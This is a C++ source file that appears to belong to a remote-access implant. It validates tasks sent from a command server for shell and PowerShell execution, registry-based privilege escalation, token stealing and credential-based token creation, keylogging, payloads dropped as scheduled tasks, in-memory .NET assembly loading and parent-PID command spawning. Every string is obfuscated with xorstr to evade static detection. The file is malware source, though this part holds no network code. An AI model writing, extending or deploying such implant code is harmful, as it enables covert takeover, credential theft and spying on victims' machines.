// ========================================== { START OF FILE } ========================================== //
#include "agent/task/task_validator.h"

#include <string>

#include "agent/models/task_types.h"
#include "xorstr/xorstr.hpp"

namespace agent::task {

    namespace {

        using models::TaskCode;
        using models::TaskType;

        /// Returns `wire_key` when the field was absent, or an empty string when it is present.
        [[nodiscard]] std::string Require(const std::string& value, const char* wire_key) {
            return value.empty() ? std::string{wire_key} : std::string{};
        }

        /// UPLOAD/DOWNLOAD: the agent acts on the path, and the server keys the stored/streamed
        /// file by the transfer id. A rewritten command that dropped TransferID used to fail
        /// silently as a success.
        [[nodiscard]] std::string MissingFileTransferField(const models::CheckinResponse& task) {
            if (std::string missing = Require(task.file_path, xorstr_("Path")); !missing.empty()) {
                return missing;
            }
            return Require(task.transfer_id, xorstr_("TransferID"));
        }

        /// ESCALATE: the registry branch and the payload to run are both required.
        [[nodiscard]] std::string MissingEscalateField(const models::CheckinResponse& task) {
            if (std::string missing = Require(task.reg_key, xorstr_("RegKey")); !missing.empty()) {
                return missing;
            }
            return Require(task.target_binary, xorstr_("TargetBinary"));
        }

        /// TOKEN: the operation decides what else is needed. A "make" command carries credentials
        /// in Username/Password, but some callers pack them into Commandlet/Arguements instead.
        [[nodiscard]] std::string MissingTokenField(const models::CheckinResponse& task) {
            if (std::string missing = Require(task.operation, xorstr_("Operation")); !missing.empty()) {
                return missing;
            }
            if (task.operation == xorstr_("make")) {
                if (task.username.empty() && task.command.commandlet.empty()) {
                    return xorstr_("Username");
                }
                if (task.password.empty() && task.command.arguments.empty()) {
                    return xorstr_("Password");
                }
            }
            if (task.operation == xorstr_("steal") && task.pid <= 0) {
                return xorstr_("PID");
            }
            return {};
        }

        /// WIN_TASK: the payload is dropped at Path and registered under TaskName; both are
        /// required. Username is optional - an empty value means the running user.
        [[nodiscard]] std::string MissingWinTaskField(const models::CheckinResponse& task) {
            if (std::string missing = Require(task.file_path, xorstr_("Path")); !missing.empty()) {
                return missing;
            }
            return Require(task.task_name, xorstr_("TaskName"));
        }

        /// PROCESS/RUN_U: the parent process and the command line to run under it.
        /// PROCESS/KILL_PROCESS: only the target PID, which the agent feeds to TerminateProcess.
        [[nodiscard]] std::string MissingProcessField(const models::CheckinResponse& task) {
            const auto code = static_cast<TaskCode>(task.code);
            if (code == TaskCode::KillProcess) {
                if (task.pid <= 0) {
                    return xorstr_("PID");
                }
                return {};
            }
            if (code == TaskCode::Run) {
                if (task.program.empty() && task.command.commandlet.empty()) {
                    return xorstr_("Program");
                }
                return {};
            }

            // RUN_U is the remaining PROCESS code with required fields; anything else is rejected
            // by the dispatcher with its own message rather than reported as a missing field.
            if (code != TaskCode::RunU) {
                return {};
            }
            if (task.pid <= 0) {
                return xorstr_("PID");
            }
            if (task.run_command.empty() && task.command.arguments.empty()) {
                return xorstr_("Command");
            }
            return {};
        }

    }  // namespace

    std::string MissingCommandField(const models::CheckinResponse& task) {
        // The command payload itself never parsed (no "Command" member, or a non-object): there is
        // no field to name beyond the command, and dropping the task silently would hide it.
        if (!task.has_command) {
            return xorstr_("Command");
        }

        switch (static_cast<TaskType>(task.type)) {
            case TaskType::Powershell:
                return Require(task.command.commandlet, xorstr_("Commandlet"));
            case TaskType::Shell:
                return Require(task.run_command, xorstr_("Command"));
            case TaskType::Escalate:
                return MissingEscalateField(task);
            case TaskType::Upload:
            case TaskType::Download:
                return MissingFileTransferField(task);
            case TaskType::Token:
                return MissingTokenField(task);
            case TaskType::Keylogger:
                return Require(task.operation, xorstr_("Operation"));
            case TaskType::WinTask:
                return MissingWinTaskField(task);
            case TaskType::NetAsm:
                // NET_ASM loads Command.Assembly (base64) into the CLR; its arguments are optional.
                return Require(task.assembly, xorstr_("Assembly"));
            case TaskType::Process:
                return MissingProcessField(task);
            default:
                // Unknown types are rejected by the dispatcher; nothing to validate against.
                return {};
        }
    }

    std::string DescribeTaskType(int type, int code) {
        switch (static_cast<TaskType>(type)) {
            case TaskType::Powershell:
                return xorstr_("POWERSHELL");
            case TaskType::Shell:
                return xorstr_("SHELL");
            case TaskType::Escalate:
                return xorstr_("ESCALATE");
            case TaskType::Upload:
                return xorstr_("UPLOAD");
            case TaskType::Download:
                return xorstr_("DOWNLOAD");
            case TaskType::Token:
                return xorstr_("TOKEN");
            case TaskType::Keylogger:
                return xorstr_("KEYLOGGER");
            case TaskType::WinTask:
                return xorstr_("WIN_TASK");
            case TaskType::NetAsm:
                return xorstr_("NET_ASM");
            case TaskType::Process:
                switch (static_cast<TaskCode>(code)) {
                    case TaskCode::RunU:
                        return xorstr_("PROCESS/RUN_U");
                    case TaskCode::KillProcess:
                        return xorstr_("PROCESS/KILL_PROCESS");
                    default:
                        break;
                }
                return xorstr_("PROCESS/code ") + std::to_string(code);
            case TaskType::Kill:
                return xorstr_("KILL");
            case TaskType::GetUid:
                return xorstr_("GET_UID");
            case TaskType::Nop:
                return xorstr_("NOP");
            default:
                return xorstr_("type ") + std::to_string(type);
        }
    }

}  // namespace agent::task
// ========================================== { END OF FILE } ========================================== //
